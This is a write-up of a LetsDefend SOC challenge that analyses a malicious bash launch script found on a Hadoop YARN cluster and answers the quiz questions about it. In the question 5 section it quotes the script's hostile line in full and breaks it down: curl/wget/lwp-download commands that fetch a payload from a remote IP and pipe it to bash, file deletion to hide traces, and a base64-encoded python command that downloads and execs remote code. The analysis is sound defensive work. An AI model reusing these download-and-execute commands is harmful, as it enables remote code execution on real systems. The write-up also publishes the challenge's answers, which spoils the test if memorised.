# LetsDefend: Bash Script Challenge

## Scenario

The SOC team uncovered a suspicious bash script linked to a critical Hadoop YARN cluster that handled large-scale data processing. This script was flagged for further investigation by L1 SOC analysts, who suspected it could be a potential breach. You have been tasked to analyze the bash script to uncover its intent.

## Set up

![image.png](/assets/writeups/letsdefend-bash-script/image.png)

The file is located in the /Desktop/ChallengeFile and is password protected. We are provided with the password.

![image.png](/assets/writeups/letsdefend-bash-script/image-1.png)

Running the `file` command identified the type of file by looking at its magic bytes and signatures. It ignores the file’s extension name. Some files are often renamed and disguised with different extensions so it is best practice to first run the `file` command to avoid assumptions based on the extension and identify the true file type.

```bash
# consider a .png image disguised as a text file named bob.txt
file bob.txt
# at first glance this seems like a text file because of its extension
# running the file command would instead return that it is a PNG image
# it ignores extension names and only makes conclusions based on magic bytes/signatures
```

## 1. What is the path set to the standard output log file?

### A. /root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/prelaunch.out

![image.png](/assets/writeups/letsdefend-bash-script/image-2.png)

This script is written in bash, a shell scripting language. The variable `PRELAUNCH_OUT` is an environmental variable, a named value that is stored in the system’s environment in which programs and scripts can reference during execution. In this case, `PRELAUNCH_OUT` stores the path to the standard output log file.

## **2. Which environment variable specifies the Java home directory?**

### A. JAVA_HOME

![image.png](/assets/writeups/letsdefend-bash-script/image-3.png)

## 3. What is the value of the “NM_HTTP_PORT” environment variable?

### A. 8042

![image.png](/assets/writeups/letsdefend-bash-script/image-4.png)

## 4. **What directory is set as the “LOCAL_DIRS” environment variable?**

### A. /root/apps/hadoopdata/nm-local-dir/usercache/dr.who/appcache/application_1617763119642_4002

![image.png](/assets/writeups/letsdefend-bash-script/image-5.png)

## 5. **The script executes a line at the end of it. What is it?**

### A. python -c 'import urllib;exec(urllib.urlopen("http://209.141.40.190/d.py").read())'

![image.png](/assets/writeups/letsdefend-bash-script/image-6.png)

In line 48, the following script is executed and performs malicious actions:

```bash
/bin/bash -c "(curl -s http://209.141.40.190/xms || wget -q -O - http://209.141.40.190/xms || lwp-download http://209.141.40.190/xms /tmp/xms) | bash -sh; bash /tmp/xms; rm -rf /tmp/xms; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -"
```


1. Downloads a file using multiple tools

```bash
/bin/bash -c "(curl -s http://209.141.40.190/xms || wget -q -O - http://209.141.40.190/xms || lwp-download http://209.141.40.190/xms /tmp/xms)
```

This attempts to download a file from hxxp[://]209[.]141[.]40[.]190/xms using `curl`, `wget`, and `lwp-download`. The `||` operator means that it moves to the next operation only if the previous one fails.

1. Executes download, file, and removes evidence

```bash
| bash -sh
| bash /tmp/xms
rm -rf /tmp/xms
```

The content downloaded was piped into bash and executed without being saved. Then downloaded again from `/tmp/xms`. It then deletes the file to avoid detection.

1. Base64 string decoded and executed

```bash
 echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -
```

`echo` prints the base64-encoded string, `base64 -d` decodes it, and `bash -` executes it. Using an online base64 decoder or running the same command without execution, you get the line that the script executes.

## 6. Which command is used to create a copy of the launch script?

### A. cp

![image.png](/assets/writeups/letsdefend-bash-script/image-7.png)

## 7. **What command is executed to determine the directory contents?**

### A.  ls -l

![image.png](/assets/writeups/letsdefend-bash-script/image-8.png)

Line 42 contains the command `ls -l`

## 8. **What IP address is used for downloading a script from the remote server?**

### A. 209[.]141[.]40[.]190

As mentioned in question 5, the executed code downloads a file from the remote server in 209[.]141[.]40[.]190.
